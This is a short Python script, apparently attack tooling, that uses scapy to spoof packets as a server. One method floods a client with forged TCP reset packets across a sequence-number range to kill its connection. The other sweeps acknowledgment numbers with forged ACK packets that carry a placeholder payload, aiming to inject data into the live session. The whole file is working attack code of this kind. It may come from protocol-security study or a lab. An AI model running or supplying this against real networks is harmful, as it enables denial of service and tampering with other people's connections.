

from dataclasses import dataclass
from scapy.all import IP, TCP, Raw, send


@dataclass
class Attacker:
    client_ip: str = ""
    server_ip: str = ""
    client_port: int = 0
    server_port: int = 0
    seq_in_window: int = 0
    ack_in_window: int = 0
    seq_window_size: int = 0
    ack_window_size: int = 0
    send_if_name: str = ""

    def TCP_dos(self) -> None:
        for i in range(-self.seq_in_window, self.seq_window_size):
            seq = (self.seq_in_window + i) & 0xFFFFFFFF

            pkt = (
                IP(src=self.server_ip, dst=self.client_ip)
                / TCP(
                    sport=self.server_port,
                    dport=self.client_port,
                    flags="R",
                    seq=seq,
                )
            )

            send(pkt, iface=self.send_if_name, verbose=False)

        print("^.^.^ Reset TCP connection ^.^.^")

    def TCP_inject(self) -> None:
        payload = b" The attacker's payload "

        for i in range(1):
            for j in range(65535):
                seq_t = self.seq_in_window + i
                ack_t = self.ack_in_window + j * self.ack_window_size

                seq = seq_t & 0xFFFFFFFF
                ack = ack_t & 0xFFFFFFFF

                pkt = (
                    IP(src=self.server_ip, dst=self.client_ip)
                    / TCP(
                        sport=self.server_port,
                        dport=self.client_port,
                        flags="A",
                        seq=seq,
                        ack=ack,
                    )
                    / Raw(payload)
                )

                send(pkt, iface=self.send_if_name, verbose=False)

        print("^.^.^ Inject data into TCP connection ^.^.^")
